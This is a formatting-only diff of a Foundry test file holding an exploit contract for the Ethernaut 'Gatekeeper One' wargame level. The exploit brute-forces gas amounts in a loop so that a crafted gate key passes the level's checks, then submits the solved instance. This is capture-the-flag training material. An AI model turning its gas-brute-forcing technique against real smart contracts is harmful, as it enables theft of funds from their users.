@@ -14,7 +14,7 @@ contract GatekeeperOneExploit {
     }
 
     function attack(bytes8 key, uint256 gasUsed) external {
-        (bool success, ) = victim.call{ gas: gasUsed }(abi.encodeWithSignature("enter(bytes8)", key));
+        (bool success,) = victim.call{ gas: gasUsed }(abi.encodeWithSignature("enter(bytes8)", key));
         require(success);
     }
 
@@ -23,7 +23,7 @@ contract GatekeeperOneExploit {
     }
 
     function checkGate2Requirement(bytes8 _gateKey) public pure returns (bool) {
-        return uint32(uint64(_gateKey)) != uint64(_gateKey); 
+        return uint32(uint64(_gateKey)) != uint64(_gateKey);
     }
 
     function checkGate1Requirement(bytes8 _gateKey) public pure returns (bool) {
@@ -34,7 +34,7 @@ contract GatekeeperOneExploit {
 contract GatekeeperOneTest is Test {
     Ethernaut ethernaut;
     address me = makeAddr("me");
-    
+
     function setUp() external {
         ethernaut = new Ethernaut();
     }
@@ -62,16 +62,16 @@ contract GatekeeperOneTest is Test {
         assert(exploit.checkGate3Requirement(gateKey, txOrigin));
         assert(exploit.checkGate2Requirement(gateKey));
         assert(exploit.checkGate1Requirement(gateKey));
-        
+
         for (uint256 i = 0; i <= 8191; i++) {
-            try exploit.attack(gateKey, i+50000) {
-                console2.log("Success - gas used = %s", i+50000);
+            try exploit.attack(gateKey, i + 50_000) {
+                console2.log("Success - gas used = %s", i + 50_000);
                 break;
             } catch {
                 // console2.log("Failed - gas used = %s", i);
             }
         }
-        
+
         // submission
         vm.startPrank(tx.origin);
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
@@ -79,4 +79,3 @@ contract GatekeeperOneTest is Test {
         assert(levelPassed);
     }
 }
-
